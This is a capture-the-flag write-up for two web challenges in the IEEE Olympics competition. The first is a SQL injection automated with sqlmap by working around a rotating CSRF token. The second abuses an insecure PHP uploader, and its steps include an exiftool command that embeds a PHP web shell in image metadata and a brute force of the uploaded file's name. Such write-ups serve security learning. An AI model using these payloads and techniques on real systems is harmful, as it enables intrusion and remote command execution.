# IEEE Olympics CTF Competition Writeups

## Description
IEEE Olympics CTF Competition organized and managed by IEEE Mansoura Student Branch & EG CERT

CTF Competition Style: jeopardy

Time: 6 hours

## Challenges
### [1- Web : Inj3ct th!s - 200 points](https://github.com/D4rkTT/IEEE-Olympics-CTF-Writeups#)

in this challenges we have login form and as challenge name its should be sql injection

so i tested it but its well protected against sql injection
so back to hints:
```You don't need to bruteforce directories or credentials at all. Do you know how search engines work?```

yes its ``robots.txt`` file

when i opened it its contain ``User-agent: * Disallow: /user_info.php``

when i opened it its only contain ``Invalid input!`` in response so i bruteforced the parameters and found ``uid`` working so i gave it value 1 
so response was 
```html
<script>document.cookie="token=1250816630"</script><meta http-equiv="refresh" content="time; URL=user_info.php?uid=1"/>
```
then redirect me and response was
```html
id: 1<br>Name: Forrest Hamilton<br>Email: accumsan.convallis.ante@convallis.net<br><script>document.cookie="token=320196787"</script>
```
when i try ``user_info.php?uid=1 AND 1=1`` & ``user_info.php?uid=1 AND 1=2`` its working perfrect but wait i can't automate the injection using sqlmap cuz csrf token :"(

token is changing and can't send more than 1 request with same token so its csrf token but every time i send request to ``user_info.php?uid=1`` response back with javascript code to set new csrf token in cookie then refresh the page to get result.

i tried a lot but no way .. i tried Roles & Macros in burp and its working in parameters only so can't get token from response body and set it to cookie in next request i can set it only to any parameters

so i can't automate the process and i must do it manually and its boolean based xD

so i tried a lot untill i did it, so i wrote a php script and run it on localhost server

the script send request without token to get new token then set it as cookie with ``setcookie`` function

and back to sqlmap and add these parameters `` --csrf-url="http://localhost/ctf/Inj3ct this.php" --csrf-token="token" `` and its asked me to merge the cookies so i said yes and holaaaa i automated sql injection with sqlmap with ``Generic UNION query (NULL) - 5 columns`` payload xD
and got DB name and table name but can't get columns because ``schema`` is blocked as hints said :(
so i brueforced it and table columns name is: `id, name, user_name, user_password`

dumped the database and got username of admin: ``admin`` and his password as plaintext: ``Sup3rS3cretP@ssw0rd``
back to login form and loggin in and holaaa here is the flag :  ````IEEE{Sch3ma0xa46480_is_Aw3some}````


### [2- Web : S3cure uploader - 200 points](https://github.com/D4rkTT/IEEE-Olympics-CTF-Writeups#)
here we have simple file uploader and we got source code
```php
<?php
if(isset($_GET["upload"])) {
$target_dir = "uploads/";
$vars = explode(".", $_FILES["FileToUpload"]["name"]);
$filename=$vars[0];
$ext = $vars[1];
//randomizing file name
$time = date('Y-m-d H:i:s');
$new_name = md5(rand(1,1000).$time.$filename."0x4148fo").".".strtolower(pathinfo(basename($_FILES["FileToUpload"]["name"]),PATHINFO_EXTENSION));
$filename=explode(".", $_FILES["FileToUpload"]["name"])[0];
$ext = $filename=explode(".", $_FILES["FileToUpload"]["name"])[1];
$target_file = $target_dir . "$new_name";
// Check if file already exists
if (file_exists($target_file)) {
  echo "File already exists.";
  $uploadOk = 0;
  die();
}
// Check file size
if ($_FILES["FileToUpload"]["size"] > 500000) {
  echo "File is too large.";
  $uploadOk = 0;
  die();
}
$uploadOk = 1;
$check = getimagesize($_FILES["FileToUpload"]["tmp_name"]);
if($check !== false) {
    $uploadOk = 1;
} else {
    echo "File is not an image.";
    $uploadOk = 0;
    die();
  }
}
move_uploaded_file($_FILES["FileToUpload"]["tmp_name"], $target_file);
if(strtolower(pathinfo(basename($_FILES["FileToUpload"]["name"]),PATHINFO_EXTENSION))=="jpg"){
echo "File uploaded successfully to $target_file";
}
else{
	die("Invalid file type");
}
?>
```
so after reading and analyse it i found big serious problem, the script check file extension after moving uploaded file to uploading folder LOL xD
but server reset every 10 mins so we have only 10 mins xD

also if i uploaded anything except jpg it won't give me the file name so i must get file name manually

but SAD the file name is md5 hash of random number + date + filename without ext + custom string WTF !!

but wait random number from 1 to 1000 only so its easy to brueforce it

and we can get date from response headers xD

and we got file name of course and custom string

but wait it check image uploaded with `getimagesize` function but its easy to bypass by injecting php payload into image exif data by ``exiftool -Comment='<?php  system($_GET['cmd']); ?>' test.jpg``

also script check file size so we should inject php payload into small image, my image size after injecting php code inside it was 677 bytes :D

then change image name to `anything.php` then upload it and get date from response and edit my php script (was have no time to write it with python or any lanuage else xD) with it then run my script
so now we have 1000 filenames as md5 hash
so back to burp intruder and paste my list on payload list and start attack and wait 200 response code and holaaaa we got web shell uploaded :D
and now we can get flag inside flag.php file :D

